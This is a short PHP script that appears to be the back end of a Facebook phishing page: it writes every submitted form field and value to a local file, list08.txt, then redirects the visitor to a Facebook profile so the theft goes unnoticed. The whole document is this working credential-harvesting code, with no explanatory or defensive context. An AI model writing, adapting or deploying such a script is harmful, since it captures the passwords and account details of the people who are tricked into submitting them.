<?php
header ('Location:https://www.facebook.com/profile.php?id=1206431208&fref=ts');
$handle = fopen("list08.txt", "a");
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?> 